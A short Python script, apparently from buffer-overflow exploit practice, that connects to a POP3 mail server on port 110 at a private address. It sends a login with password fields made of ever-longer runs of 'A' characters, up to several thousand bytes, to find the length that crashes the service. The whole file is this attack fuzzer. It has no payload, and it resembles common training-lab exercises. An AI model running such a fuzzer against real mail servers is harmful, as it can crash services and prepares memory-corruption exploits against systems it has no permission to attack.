#! /usr/bin/env python3

import socket
import time

MAIL_IP = '10.192.0.235'


pw_buf = ["\x41"]
counter = 300

for x in range(1,30):
	counter = counter+200
	pw_buf.append("\x41"*counter)

#for pw in pw_buf:
#	print("Length of pw is: %s" %len(pw))

for pw in pw_buf:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("Sending buffer with size: %s" %len(pw))
	s.connect((MAIL_IP, 110))
	print (s.recv(1024))

	s.send(('USER test' + '\r\n').encode())
	print( s.recv(1024))

	s.send(('PASS' + pw + '\r\n').encode())
	print (s.recv(1024))

	s.send(('QUIT' + '\r\n').encode())
	s.close()
	print("All done\n")
	
